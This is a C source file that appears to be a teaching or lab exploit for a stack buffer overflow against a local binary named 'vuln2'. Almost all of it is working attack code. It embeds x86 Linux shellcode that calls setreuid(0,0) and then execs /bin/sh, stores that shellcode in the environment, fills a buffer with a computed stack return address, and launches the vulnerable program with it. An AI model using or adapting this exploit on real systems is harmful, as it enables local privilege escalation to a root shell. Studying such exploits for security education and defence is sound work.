#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

char shellcode[] =
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
"\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d"
"\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
"\x68\x90";

// Size of the buffer in Bytes (works if >= 21)
#define BUFFER_SIZE 22 // 40

int main(int argc, char *argv[])
{
    char *env[2] = {shellcode, NULL};
    int i;
    long  ret, *addr_ptr;
    char *buffer, *ptr;

    // Allocate BUFFER_SIZE bytes for buffer (on the heap)
    buffer = malloc(BUFFER_SIZE);

    // Calculate the location of the shellcode
    ret = 0xbffffffa - strlen(shellcode) - strlen("./vuln2");
    printf("Ret Address %lx\n",ret);
    // Fill the entire buffer with the desired ret address
    ptr = buffer;
    addr_ptr = (long *) ptr;
    for(i=0; i < BUFFER_SIZE; i+=4)
    {
        *(addr_ptr++) = ret;
    }

    // End the string
    buffer[BUFFER_SIZE-1] = 0;

    // Now call the program ./vuln with our crafted buffer as its argument
    // and using the environment env as its environment.
    execle("./vuln2", "vuln2", buffer, NULL, env);

    return 0;
}
